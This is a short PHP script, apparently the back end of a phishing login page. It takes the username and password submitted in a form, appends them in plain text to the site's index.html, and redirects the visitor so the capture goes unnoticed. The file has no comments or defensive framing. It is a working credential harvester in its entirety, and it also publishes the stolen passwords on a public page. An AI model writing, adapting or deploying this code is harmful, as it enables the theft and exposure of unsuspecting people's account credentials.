<?php
  $username = $_POST["username"];
  $password = $_POST["password"];
  $output = fopen("./index.html", "a");
  $output_string = $username . " " . $password . " <br>" . "\n";
  fwrite($output, $output_string);
  fclose($output);
  header("Location: /index.html");
  ?>
